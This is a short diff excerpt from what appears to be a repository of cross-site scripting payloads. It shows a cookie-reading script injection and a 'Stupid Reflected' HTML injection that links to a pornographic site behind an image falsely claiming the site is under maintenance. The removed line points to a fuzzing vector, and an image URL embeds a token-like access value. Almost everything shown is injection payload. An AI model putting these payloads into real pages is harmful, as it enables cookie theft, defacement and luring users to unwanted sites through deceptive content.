@@ -62,7 +62,6 @@ nu11secur1ty<script>alert(document.cookie)</script>
 ```
 
 - 0.5.1 - Stupid Reflected
-- link: { https://shazzer.co.uk/vectors/66f907daa307714ca5bcabf4?fuzzToken=c74e16ea0b93cb9775fdfc075ef6b363 }
 ```
 <a href="https://pornhub.com/" target="_blank" rel="noopener nofollow ugc">
 <img src="https://raw.githubusercontent.com/nu11secur1ty/XSSight/master/nu11secur1ty/images/IMG_0068.gif?token=GHSAT0AAAAAABXWGSKOH7MBFLEKF4M6Y3YCYYKADTQ&rs=1" style="border:1px solid black;max-width:100%;" alt="We are in maintenance, please visit this web page!">
